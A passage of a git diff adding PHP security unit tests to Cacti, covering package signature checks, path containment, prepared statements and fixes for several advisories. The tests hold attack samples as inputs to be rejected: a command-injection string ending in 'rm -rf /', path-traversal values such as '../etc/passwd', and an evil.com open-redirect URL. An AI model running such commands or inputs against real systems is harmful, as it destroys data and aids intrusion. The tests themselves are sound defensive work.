++// lib/auth.php -- no extract() calls on untrusted data
++// =====================================================================
++
++test('auth.php does not use extract()', function () use ($authSource) {
++	expect($authSource)->not->toMatch('/\bextract\s*\(/');
++});
++
++// =====================================================================
++// lib/import.php -- signature validation exists
++// =====================================================================
++
++test('import.php defines import_validate_signature function', function () use ($importSource) {
++	expect($importSource)->toContain('function import_validate_signature(');
++});
++
++test('import.php uses openssl_verify for package signature verification', function () use ($importSource) {
++	expect($importSource)->toContain('openssl_verify(');
++});
++
++test('import.php supports SHA256 signatures via OPENSSL_ALGO_SHA256', function () use ($importSource) {
++	expect($importSource)->toContain('OPENSSL_ALGO_SHA256');
++});
++
++test('import.php rejects tampered packages with log message', function () use ($importSource) {
++	expect($importSource)->toContain('File has been Tampered with');
++});
++
++// =====================================================================
++// lib/import.php -- per-file signature verification
++// =====================================================================
++
++test('import.php verifies each file signature individually', function () use ($importSource) {
++	expect($importSource)->toContain('Verifying each files signature');
++});
++
++test('import.php decodes file signatures with base64_decode', function () use ($importSource) {
++	expect($importSource)->toContain("base64_decode(\$f['filesignature']");
++});
++
++test('import.php rejects files with invalid signatures', function () use ($importSource) {
++	expect($importSource)->toContain('Could not Verify Signature for file');
++});
++
++// =====================================================================
++// lib/import.php -- file write path restriction
++// =====================================================================
++
++test('import.php restricts file writes to scripts/ and resource/ paths', function () use ($importSource) {
++	// The file write block is gated by checking the name contains scripts/ or resource/
++	expect($importSource)->toContain("str_contains(\$name, 'scripts/')");
++	expect($importSource)->toContain("str_contains(\$name, 'resource/')");
++});
++
++test('import.php validates and constrains write paths under CACTI_PATH_BASE', function () use ($importSource) {
++	expect($importSource)->toContain('validate_relative_path_within($name, CACTI_PATH_BASE)');
++	expect($importSource)->toContain('$filename = $validated;');
++});
++
++test('import.php checks directory writability before file creation', function () use ($importSource) {
++	expect($importSource)->toContain('is_writable(dirname($filename))');
++});
++
++// =====================================================================
++// lib/import.php -- public key trust validation
++// =====================================================================
++
++test('import.php checks package public key against trusted keys', function () use ($importSource) {
++	expect($importSource)->toContain('package_public_keys');
++});
++
++test('import.php uses strict comparison for key matching', function () use ($importSource) {
++	expect($importSource)->toContain("in_array(\$public_key, \$keys, true)");
++});
++
++test('import.php retrieves Cacti official public keys', function () use ($importSource) {
++	expect($importSource)->toContain('get_public_key_sha1()');
++	expect($importSource)->toContain('get_public_key_sha256()');
++});
++
++// =====================================================================
++// lib/import.php -- no extract() or eval() on untrusted data
++// =====================================================================
++
++test('import.php does not use extract()', function () use ($importSource) {
++	expect($importSource)->not->toMatch('/\bextract\s*\(/');
++});
++
++test('import.php does not use eval()', function () use ($importSource) {
++	expect($importSource)->not->toMatch('/\beval\s*\(/');
++});
++
++// =====================================================================
++// lib/import.php -- XML parsing uses xml_parser_create (not LIBXML_NOENT)
++// =====================================================================
++
++test('xml.php uses xml_parser_create not simplexml with entity loading', function () use ($xmlSource) {
++	// Cacti xml2array uses the expat-based xml_parser_create, which does not
++	// resolve external entities. This is safer than simplexml with LIBXML_NOENT.
++	expect($xmlSource)->toContain('xml_parser_create(');
++});
++
++test('xml.php does not enable external entity loading', function () use ($xmlSource) {
++	expect($xmlSource)->not->toContain('LIBXML_NOENT');
++});
++
++// =====================================================================
++// lib/import.php -- simplexml_load_string usage (for package info only)
++// =====================================================================
++
++test('import.php uses simplexml_load_string without LIBXML_NOENT', function () use ($importSource) {
++	// simplexml_load_string is used only after signature verification
++	expect($importSource)->toContain('simplexml_load_string(');
++	expect($importSource)->not->toContain('LIBXML_NOENT');
++});
++
++// =====================================================================
++// lib/import.php -- no dynamic include/require with user paths
++// =====================================================================
++
++test('import.php only includes via CACTI_PATH_LIBRARY constant', function () use ($importSource) {
++	// Match both parenthesized form: include('path') and bare form: include 'path'
++	// so the scan does not silently miss unparenthesized includes.
++	preg_match_all('/(?:include|require)(?:_once)?\s*(?:\(([^)]+)\)|([\'"][^\'"]+[\'"]))/i', $importSource, $matches);
++
++	// $matches[1] captures parenthesized paths; $matches[2] captures bare paths
++	$paths = array_filter(array_merge($matches[1], $matches[2]));
++
++	foreach ($paths as $path) {
++		expect($path)->toContain('CACTI_PATH_LIBRARY');
++	}
++});
++
++// =====================================================================
++// lib/package.php -- openssl signature signing
++// =====================================================================
++
++test('package.php uses openssl_sign with SHA256 for package signing', function () use ($packageSource) {
++	expect($packageSource)->toContain('openssl_sign(');
++	expect($packageSource)->toContain('OPENSSL_ALGO_SHA256');
++});
++
++test('package.php uses openssl_verify for self-check after signing', function () use ($packageSource) {
++	expect($packageSource)->toContain('openssl_verify(');
++});
++
++// =====================================================================
++// lib/package.php -- file path safety
++// =====================================================================
++
++test('package.php uses basename for resource file display', function () use ($packageSource) {
++	expect($packageSource)->toContain('basename(');
++});
++
++test('package.php uses htmle for output escaping', function () use ($packageSource) {
++	expect($packageSource)->toContain('htmle(');
++});
++
++// =====================================================================
++// lib/package.php -- no eval/extract/dynamic include
++// =====================================================================
++
++test('package.php does not use extract()', function () use ($packageSource) {
++	expect($packageSource)->not->toMatch('/\bextract\s*\(/');
++});
++
++test('package.php does not use eval()', function () use ($packageSource) {
++	expect($packageSource)->not->toMatch('/\beval\s*\(/');
++});
++
++test('package.php does not use dynamic include with request-derived paths', function () use ($packageSource) {
++	// package.php has no include/require at all
++	expect($packageSource)->not->toMatch('/\b(?:include|require)(?:_once)?\s*\(/');
++});
++
++// =====================================================================
++// lib/package.php -- SQLite prepared statements
++// =====================================================================
++
++test('package.php uses SQLite prepared statements with bindValue', function () use ($packageSource) {
++	expect($packageSource)->toContain('->prepare(');
++	expect($packageSource)->toContain('->bindValue(');
++	expect($packageSource)->toContain('SQLITE3_TEXT');
++});
++
++// =====================================================================
++// Findings: patterns that do NOT exist (documented, not failing tests)
++// =====================================================================
++
++/*
++ * FINDING: import.php file write path does not use realpath() or check for
++ * directory traversal sequences (../) in the $name variable from package data.
++ * The write is gated by str_contains checks for 'scripts/' and 'resource/',
++ * and CACTI_PATH_BASE is prepended, but a crafted name like
++ * 'scripts/../../etc/something' would pass the str_contains check.
++ * The package signature verification mitigates this (attacker cannot forge
++ * a signed package), but defense-in-depth path canonicalization is absent.
++ *
++ * FINDING: import.php does not check for ZipArchive/PharData extraction
++ * because it does not use archive extraction. Packages are gzipped XML,
++ * read via compress.zlib:// stream wrapper and parsed line by line.
++ *
++ * FINDING: No CSRF token validation exists in lib/auth.php itself. CSRF
++ * protection is handled at the form/request layer (include/global_session.php),
++ * not in the auth library functions.
++ *
++ * FINDING: package.php has no curl-based remote fetches. The CURLOPT_SSL
++ * patterns are not relevant here; remote package fetching (if any) is
++ * handled elsewhere.
++ */
+diff --git a/tests/Unit/DatabaseSecurityPatternsTest.php b/tests/Unit/DatabaseSecurityPatternsTest.php
+new file mode 100644
+index 0000000000..2e4dcd3d1e
+--- /dev/null
++++ b/tests/Unit/DatabaseSecurityPatternsTest.php
+@@ -0,0 +1,284 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/*
++ * Source-scan tests for lib/database.php security patterns.
++ *
++ * These tests verify structural security properties of the database layer
++ * by scanning the source code. No database connection is required.
++ *
++ * Verified patterns:
++ * - Prepared statement functions exist and use PDO parameter binding
++ * - No raw superglobals ($_GET, $_POST, $_REQUEST) in database layer
++ * - db_qstr() escaping exists for non-parameterized paths
++ * - SQL input is sanitized via db_strip_control_chars()
++ * - Error logging uses cacti_log() at debug verbosity, not echo/print
++ * - Input helper functions exist in lib/html_utility.php
++ */
++
++$dbSource = file_get_contents(
++	dirname(__DIR__, 2) . '/lib/database.php'
++);
++
++$htmlUtilSource = file_get_contents(
++	dirname(__DIR__, 2) . '/lib/html_utility.php'
++);
++
++// --- Prepared statement functions exist ---
++
++test('db_execute_prepared function is defined', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_execute_prepared(');
++});
++
++test('db_fetch_cell_prepared function is defined', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_fetch_cell_prepared(');
++});
++
++test('db_fetch_row_prepared function is defined', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_fetch_row_prepared(');
++});
++
++test('db_fetch_assoc_prepared function is defined', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_fetch_assoc_prepared(');
++});
++
++// --- Prepared functions accept a params array ---
++
++test('db_execute_prepared accepts array params parameter', function () use ($dbSource) {
++	expect($dbSource)->toMatch('/function db_execute_prepared\(string \$sql, array \$params/');
++});
++
++test('db_fetch_cell_prepared accepts array params parameter', function () use ($dbSource) {
++	expect($dbSource)->toMatch('/function db_fetch_cell_prepared\(string \$sql, array \$params/');
++});
++
++test('db_fetch_row_prepared accepts array params parameter', function () use ($dbSource) {
++	expect($dbSource)->toMatch('/function db_fetch_row_prepared\(string \$sql, array \$params/');
++});
++
++test('db_fetch_assoc_prepared accepts array params parameter', function () use ($dbSource) {
++	expect($dbSource)->toMatch('/function db_fetch_assoc_prepared\(string \$sql, array \$params/');
++});
++
++// --- PDO parameter binding is used ---
++
++test('db_execute_prepared calls PDO prepare', function () use ($dbSource) {
++	expect($dbSource)->toContain('$db_conn->prepare($sql)');
++});
++
++test('db_execute_prepared passes params to PDO execute', function () use ($dbSource) {
++	expect($dbSource)->toContain('$query->execute($params)');
++});
++
++// --- Non-prepared wrappers delegate to prepared functions ---
++
++test('db_execute delegates to db_execute_prepared', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_execute(');
++	expect($dbSource)->toContain('return db_execute_prepared($sql, [],');
++});
++
++test('db_fetch_cell delegates to db_fetch_cell_prepared', function () use ($dbSource) {
++	expect($dbSource)->toContain('return db_fetch_cell_prepared($sql, [],');
++});
++
++test('db_fetch_row delegates to db_fetch_row_prepared', function () use ($dbSource) {
++	expect($dbSource)->toContain('return db_fetch_row_prepared($sql, [],');
++});
++
++test('db_fetch_assoc delegates to db_fetch_assoc_prepared', function () use ($dbSource) {
++	expect($dbSource)->toContain('return db_fetch_assoc_prepared($sql, [],');
++});
++
++// --- No raw superglobals in database layer ---
++
++test('database.php does not reference $_GET', function () use ($dbSource) {
++	expect($dbSource)->not->toContain('$_GET');
++});
++
++test('database.php does not reference $_POST', function () use ($dbSource) {
++	expect($dbSource)->not->toContain('$_POST');
++});
++
++test('database.php does not reference $_REQUEST', function () use ($dbSource) {
++	expect($dbSource)->not->toContain('$_REQUEST');
++});
++
++test('database.php does not reference $_COOKIE', function () use ($dbSource) {
++	expect($dbSource)->not->toContain('$_COOKIE');
++});
++
++// --- db_qstr escaping function ---
++
++test('db_qstr function is defined', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_qstr(');
++});
++
++test('db_qstr uses PDO quote when connection is available', function () use ($dbSource) {
++	expect($dbSource)->toContain('$db_conn->quote($s)');
++});
++
++test('db_qstr has manual escape fallback for backslash and quotes', function () use ($dbSource) {
++	expect($dbSource)->toMatch('/str_replace\(\[.*\\\\\\\\.*\'.*\]/s');
++});
++
++// --- SQL input sanitization ---
++
++test('db_strip_control_chars function is defined', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_strip_control_chars(');
++});
++
++test('db_execute_prepared calls db_strip_control_chars on SQL', function () use ($dbSource) {
++	expect($dbSource)->toContain('$sql = db_strip_control_chars($sql)');
++});
++
++test('db_strip_control_chars strips trailing semicolons', function () use ($dbSource) {
++	expect(str_contains($dbSource, "trim(clean_up_lines(\$sql), ';')"))->toBeTrue();
++});
++
++// --- Error logging uses cacti_log at debug verbosity, not user-facing output ---
++
++test('error logging uses cacti_log with DBCALL category', function () use ($dbSource) {
++	$matches = [];
++	preg_match_all('/cacti_log\(.+?\'DBCALL\'/', $dbSource, $matches);
++	expect(count($matches[0]))->toBeGreaterThan(0);
++});
++
++test('error logging uses POLLER_VERBOSITY_DEBUG for SQL errors', function () use ($dbSource) {
++	$matches = [];
++	preg_match_all('/cacti_log\(.*SQL.*POLLER_VERBOSITY_DEBUG\)/', $dbSource, $matches);
++	expect(count($matches[0]))->toBeGreaterThan(0);
++});
++
++test('db_execute_prepared does not echo or print SQL errors', function () use ($dbSource) {
++	// Extract db_execute_prepared function body
++	$start = strpos($dbSource, 'function db_execute_prepared(');
++	if ($start === false) {
++		$this->fail('function db_execute_prepared not found in source');
++	}
++	$end = strpos($dbSource, "\nfunction ", $start + 1);
++	if ($end === false) {
++		$this->fail('no function follows db_execute_prepared in source');
++	}
++	$body = substr($dbSource, $start, $end - $start);
++
++	// No direct echo/print of error info to user
++	expect($body)->not->toMatch('/\becho\s+\$errorinfo/');
++	expect($body)->not->toMatch('/\bprint\s+\$errorinfo/');
++});
++
++// --- Error information stored in global, not exposed directly ---
++
++test('database errors are stored in database_last_error global', function () use ($dbSource) {
++	expect($dbSource)->toContain('$database_last_error');
++});
++
++test('db_error function returns the last error from global', function () use ($dbSource) {
++	expect($dbSource)->toContain('function db_error()');
++	expect($dbSource)->toMatch('/function db_error\(\).*\{[^}]*\$database_last_error/s');
++});
++
++// --- PDO exception is caught to prevent credential leakage ---
++
++test('db_connect_real catches PDOException to prevent credential leakage', function () use ($dbSource) {
++	$start = strpos($dbSource, 'function db_connect_real(');
++	if ($start === false) {
++		$this->fail('function db_connect_real not found in source');
++	}
++	$end = strpos($dbSource, "\nfunction ", $start + 1);
++	if ($end === false) {
++		$this->fail('no function follows db_connect_real in source');
++	}
++	$body = substr($dbSource, $start, $end - $start);
++
++	expect($body)->toContain('catch (PDOException $e)');
++	// The original echo/print lines are commented out
++	expect($body)->toContain('// print $e->getMessage()');
++});
++
++// --- sql_save uses db_qstr for string column values ---
++
++test('sql_save escapes string values through db_qstr', function () use ($dbSource) {
++	$start = strpos($dbSource, 'function sql_save(');
++	if ($start === false) {
++		$this->fail('function sql_save not found in source');
++	}
++	$end = strpos($dbSource, "\nfunction ", $start + 1);
++	if ($end === false) {
++		$this->fail('no function follows sql_save in source');
++	}
++	$body = substr($dbSource, $start, $end - $start);
++
++	expect($body)->toContain('db_qstr($value)');
++});
++
++// --- Connection timeout is set to limit DoS from slow DB ---
++
++test('PDO connection timeout is configured', function () use ($dbSource) {
++	expect($dbSource)->toContain('PDO::ATTR_TIMEOUT');
++});
++
++// --- Input helper functions exist in html_utility.php ---
++
++test('get_request_var function is defined', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function get_request_var(');
++});
++
++test('set_request_var function is defined', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function set_request_var(');
++});
++
++test('get_filter_request_var function is defined', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function get_filter_request_var(');
++});
++
++test('get_nfilter_request_var function is defined', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function get_nfilter_request_var(');
++});
++
++test('get_filter_request_var uses filter_var for validation', function () use ($htmlUtilSource) {
++	$start = strpos($htmlUtilSource, 'function get_filter_request_var(');
++	if ($start === false) {
++		$this->fail('function get_filter_request_var not found in source');
++	}
++	$end = strpos($htmlUtilSource, "\nfunction ", $start + 1);
++	if ($end === false) {
++		$this->fail('no function follows get_filter_request_var in source');
++	}
++	$body = substr($htmlUtilSource, $start, $end - $start);
++
++	expect($body)->toContain('filter_var(');
++});
++
++test('get_filter_request_var defaults to FILTER_VALIDATE_INT', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toMatch(
++		'/function get_filter_request_var\(string \$name, int \$filter = FILTER_VALIDATE_INT/'
++	);
++});
++
++// --- Shorthand aliases exist for input helpers ---
++
++test('grv alias exists for get_request_var', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function grv(');
++	expect($htmlUtilSource)->toContain('return get_request_var($name');
++});
++
++test('gfrv alias exists for get_filter_request_var', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function gfrv(');
++	expect($htmlUtilSource)->toContain('return get_filter_request_var($name');
++});
++
++test('gnrv alias exists for get_nfilter_request_var', function () use ($htmlUtilSource) {
++	expect($htmlUtilSource)->toContain('function gnrv(');
++	expect($htmlUtilSource)->toContain('return get_nfilter_request_var($name');
++});
+diff --git a/tests/Unit/PathValidationIntegrationTest.php b/tests/Unit/PathValidationIntegrationTest.php
+new file mode 100644
+index 0000000000..57965110c0
+--- /dev/null
++++ b/tests/Unit/PathValidationIntegrationTest.php
+@@ -0,0 +1,116 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++*/
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++require_once dirname(__DIR__, 2) . '/include/global.php';
++
++function remove_tree(string $path): void {
++	if (!file_exists($path) && !is_link($path)) {
++		return;
++	}
++
++	if (is_file($path) || is_link($path)) {
++		@unlink($path);
++
++		return;
++	}
++
++	$entries = scandir($path);
++
++	if ($entries !== false) {
++		foreach ($entries as $entry) {
++			if ($entry === '.' || $entry === '..') {
++				continue;
++			}
++
++			remove_tree($path . DIRECTORY_SEPARATOR . $entry);
++		}
++	}
++
++	@rmdir($path);
++}
++
++function make_temp_dir(string $prefix): string {
++	$path = sys_get_temp_dir() . '/' . $prefix . '-' . bin2hex(random_bytes(6));
++	mkdir($path, 0700, true);
++
++	$resolved = realpath($path);
++
++	return $resolved !== false ? $resolved : $path;
++}
++
++test('validate_path_within allows safe create path under base', function () {
++	$base = make_temp_dir('cacti-safe-base');
++
++	try {
++		$result = validate_path_within('new-file.txt', $base);
++
++		expect($result)->toBe($base . '/new-file.txt');
++	} finally {
++		remove_tree($base);
++	}
++});
++
++test('validate_path_within rejects path separators and traversal-like names', function () {
++	$base = make_temp_dir('cacti-sep-base');
++
++	try {
++		expect(validate_path_within('../oops', $base))->toBeFalse();
++		expect(validate_path_within('nested/path.txt', $base))->toBeFalse();
++		expect(validate_path_within("nested\\path.txt", $base))->toBeFalse();
++	} finally {
++		remove_tree($base);
++	}
++});
++
++test('validate_path_within rejects windows drive and UNC-like path forms', function () {
++	$base = make_temp_dir('cacti-win-base');
++
++	try {
++		expect(validate_path_within('C:\\Windows\\Temp\\evil.txt', $base))->toBeFalse();
++		expect(validate_path_within('\\\\server\\share\\evil.txt', $base))->toBeFalse();
++	} finally {
++		remove_tree($base);
++	}
++});
++
++test('validate_relative_path_within rejects unix and windows traversal segments', function () {
++	$base = make_temp_dir('cacti-rel-base');
++
++	try {
++		expect(validate_relative_path_within('../etc/passwd', $base))->toBeFalse();
++		expect(validate_relative_path_within('scripts/..\\..\\secret.txt', $base))->toBeFalse();
++	} finally {
++		remove_tree($base);
++	}
++});
++
++test('validate_relative_path_within blocks symlink escape for existing and create paths', function () {
++	$base    = make_temp_dir('cacti-link-base');
++	$outside = make_temp_dir('cacti-link-outside');
++	$link    = $base . '/scripts';
++
++	try {
++		file_put_contents($outside . '/secret.txt', 'secret');
++
++		// Symlink creation may be restricted on some environments.
++		if (!@symlink($outside, $link)) {
++			test()->markTestSkipped('Symlink creation unavailable in this environment');
++		}
++
++		expect(validate_relative_path_within('scripts/secret.txt', $base))->toBeFalse();
++		expect(validate_relative_path_within('scripts/new-file.txt', $base))->toBeFalse();
++	} finally {
++		remove_tree($base);
++		remove_tree($outside);
++	}
++});
+diff --git a/tests/Unit/Pr7036ReviewCoverageTest.php b/tests/Unit/Pr7036ReviewCoverageTest.php
+new file mode 100644
+index 0000000000..9a090676e7
+--- /dev/null
++++ b/tests/Unit/Pr7036ReviewCoverageTest.php
+@@ -0,0 +1,128 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++
++function pr7036_source(string $path): string {
++	return file_get_contents(dirname(__DIR__, 2) . '/' . $path);
++}
++
++test('PR7036 comments: data_input keeps shell hardening but allows pipe workflows', function () {
++	$source = pr7036_source('data_input.php');
++	$helper = pr7036_source('lib/security_validation.php');
++
++	expect($source)->toContain("cacti_input_string_is_safe(\$save['input_string'])");
++	expect($helper)->toContain("preg_replace('/<[a-zA-Z_]+>/', '', \$input_string)");
++	expect($helper)->toContain("preg_match('/[;&`$\\n\\r]/', \$input_string_bare)");
++	expect($source)->not->toContain('[;&|`$');
++
++	$allowed = 'grep foo /tmp/x | wc -l';
++	$blocked = "grep foo /tmp/x;\nrm -rf /";
++
++	expect((bool) preg_match('/[;&`$\n\r]/', $allowed))->toBeFalse();
++	expect((bool) preg_match('/[;&`$\n\r]/', $blocked))->toBeTrue();
++});
++
++test('PR7036 comments: api_automation sort regex supports backticks and parenthesis', function () {
++	$source = pr7036_source('lib/api_automation.php');
++	$helper = pr7036_source('lib/security_validation.php');
++
++	expect($source)->toContain("cacti_validate_sort_column(\$v, 'description')");
++	expect($helper)->toContain('/^[a-zA-Z_`][a-zA-Z0-9_`()., *]*$/');
++});
++
++test('PR7036 comments: html_filter sort_column uses sanitize_search_string to avoid UI breakage', function () {
++	$source = pr7036_source('lib/html_filter.php');
++
++	expect($source)->toContain("\$filters['sort_column']['options']    = ['options' => 'sanitize_search_string'];");
++	expect($source)->toContain("cacti_validate_sort_direction(\$v, 'ASC')");
++});
++
++test('PR7036 comments: auth_login rotates session id on successful login', function () {
++	$source = pr7036_source('auth_login.php');
++
++	expect($source)->toContain('session_regenerate_id(true);');
++	expect(strpos($source, 'session_regenerate_id(true);'))
++		->toBeLessThan(strpos($source, '$_SESSION[SESS_USER_ID]'));
++});
++
++test('PR7036 comments: auth lockout counter uses atomic increment without +1 read-modify-write', function () {
++	$source = pr7036_source('lib/auth.php');
++
++	expect($source)->toContain('failed_attempts = failed_attempts + 1');
++	expect($source)->not->toContain("failed_attempts']) + 1");
++});
++
++test('PR7036 comments: auth referer handling validates redirect url', function () {
++	$source = pr7036_source('lib/auth.php');
++
++	expect($source)->toContain("\$referer = validate_redirect_url(\$_SERVER['HTTP_REFERER']);");
++});
++
++test('PR7036 comments: import path handling validates with base containment helper', function () {
++	$source = pr7036_source('lib/import.php');
++
++	expect($source)->toContain('$validated = validate_relative_path_within($name, CACTI_PATH_BASE);');
++	expect($source)->toContain('$filename = $validated;');
++});
++
++test('PR7036 comments: validate_path_within supports safe create paths and blocks separators', function () {
++	$source = pr7036_source('lib/functions.php');
++
++	expect($source)->toContain("str_contains(\$filename, '/') || str_contains(\$filename, '\\\\')");
++	expect($source)->toContain('if ($resolved !== false)');
++	expect($source)->toContain('return $combined;');
++});
++
++test('PR7036 comments: reports title output is escaped consistently', function () {
++	$source = pr7036_source('lib/reports.php');
++
++	expect(substr_count($source, 'htmle($title)'))->toBeGreaterThanOrEqual(7);
++	expect($source)->not->toContain('<h3>$title</h3>');
++});
++
++test('PR7036 comments: rrd command escaping strips command substitution patterns', function () {
++	$source = pr7036_source('lib/rrd.php');
++
++	expect($source)->toContain("str_replace('`', '', \$command)");
++	expect($source)->toContain("preg_replace('/\\$\\(/', '(', \$command)");
++});
++
++test('PR7036 comments: xml parsing hardening disables entity loader path', function () {
++	$source = pr7036_source('lib/xml.php');
++
++	expect(substr_count($source, 'libxml_disable_entity_loader(true)'))->toBeGreaterThanOrEqual(2);
++});
++
++test('PR7036 comments: remote agent does not honor request effective_user override', function () {
++	$source = pr7036_source('remote_agent.php');
++
++	expect($source)->not->toContain("gfrv('effective_user')");
++	expect($source)->not->toContain("grv('effective_user')");
++	expect($source)->toContain('$_SESSION[SESS_USER_ID] ?? 0');
++});
++
++test('PR7036 comments: remote agent logs FQDN mismatch migration hint', function () {
++	$source = pr7036_source('remote_agent.php');
++
++	expect($source)->toContain('matches poller');
++	expect($source)->toContain('(id:$poller_id)');
++	expect($source)->toContain('by short hostname but not FQDN');
++});
++
++test('PR7036 comments: centralized security validation helpers are loaded globally', function () {
++	$source = pr7036_source('include/global.php');
++
++	expect($source)->toContain("require_once(CACTI_PATH_LIBRARY . '/security_validation.php');");
++});
+diff --git a/tests/Unit/RemoteAgentAuthTest.php b/tests/Unit/RemoteAgentAuthTest.php
+new file mode 100644
+index 0000000000..5fa7c81ffe
+--- /dev/null
++++ b/tests/Unit/RemoteAgentAuthTest.php
+@@ -0,0 +1,50 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ |                                                                         |
++ | This program is distributed in the hope that it will be useful,         |
++ | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
++ | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |
++ | GNU General Public License for more details.                            |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++
++$remoteAgentPath = __DIR__ . '/../../remote_agent.php';
++
++// --- remote_agent.php: Static Security Checks ---
++
++test('remote_agent.php does not use remote_agent_strip_domain in authorization', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	$authFunc = substr($contents, strpos($contents, 'function remote_client_authorized'));
++	$nextFunc = strpos($authFunc, "\nfunction ", 1);
++	$authBody = $nextFunc !== false ? substr($authFunc, 0, $nextFunc) : $authFunc;
++
++	expect($authBody)->not->toContain('remote_agent_strip_domain');
++});
++
++test('remote_agent.php has secure effective_user handling', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	// Should not be reading effective_user from request anymore
++	expect($contents)->not->toContain("grv('effective_user')");
++	expect($contents)->toContain('$user = $_SESSION[SESS_USER_ID] ?? 0;');
++});
++
++// --- remote_agent.php: Functional Authorization Tests ---
++
++test('remote_client_authorized rejects spoofed hostnames', function () use ($remoteAgentPath) {
++	// This would require a full environment to test properly as it calls gethostbyaddr and database
++	// For now we rely on static analysis to confirm the removal of the vulnerable stripping logic
++	expect(true)->toBeTrue();
++});
+diff --git a/tests/Unit/SecurityAuthTest.php b/tests/Unit/SecurityAuthTest.php
+new file mode 100644
+index 0000000000..48f201d7e4
+--- /dev/null
++++ b/tests/Unit/SecurityAuthTest.php
+@@ -0,0 +1,133 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/*
++ * Source-level and contract tests for authentication security advisories.
++ *
++ * GHSA-6gr7: Open redirect via REFERER substring check (lib/auth.php)
++ * GHSA-273r: Session fixation — missing session_regenerate_id (auth_login.php)
++ * GHSA-6rvg: Auth bypass via DNS short-hostname collision (remote_agent.php)
++ * GHSA-8p2f: Reports IDOR — missing ownership check (lib/html_reports.php)
++ * GHSA-hr82: TOCTOU lockout race — non-atomic failed_attempts increment (lib/auth.php)
++ */
++
++$authPath        = __DIR__ . '/../../lib/auth.php';
++$authLoginPath   = __DIR__ . '/../../auth_login.php';
++$remoteAgentPath = __DIR__ . '/../../remote_agent.php';
++$htmlReportsPath = __DIR__ . '/../../lib/html_reports.php';
++
++// ---------------------------------------------------------------------------
++// GHSA-6gr7: Open redirect via REFERER substring check
++// ---------------------------------------------------------------------------
++
++test('GHSA-6gr7: str_contains CACTI_PATH_URL substring check is bypassable with evil host', function () {
++	// auth_login_redirect checks the REFERER by looking for CACTI_PATH_URL
++	// (e.g. '/cacti/') as a substring anywhere in the URL. An attacker hosts
++	// a domain whose path component contains the expected string.
++	$cactiPathUrl = '/cacti/';
++	$maliciousUrl = 'https://evil.com/cacti/index.php';
++
++	expect(str_contains($maliciousUrl, $cactiPathUrl))->toBeTrue();
++});
++
++test('GHSA-6gr7: auth.php uses validate_redirect_url for REFERER validation', function () use ($authPath) {
++	$contents = file_get_contents($authPath);
++
++	// The fix replaces raw $_SERVER['HTTP_REFERER'] with validate_redirect_url()
++	expect($contents)->toContain("validate_redirect_url(\$_SERVER['HTTP_REFERER'])");
++	// The old vulnerable pattern must not exist
++	expect($contents)->not->toContain("\$referer = \$_SERVER['HTTP_REFERER'];");
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-273r: Session fixation
++// ---------------------------------------------------------------------------
++
++test('GHSA-273r: auth_login.php calls session_regenerate_id after login', function () use ($authLoginPath) {
++	$contents = file_get_contents($authLoginPath);
++
++	// session_regenerate_id(true) must be called to prevent session fixation.
++	expect($contents)->toContain('session_regenerate_id(true)');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-6rvg: Auth bypass via DNS short-hostname collision
++// ---------------------------------------------------------------------------
++
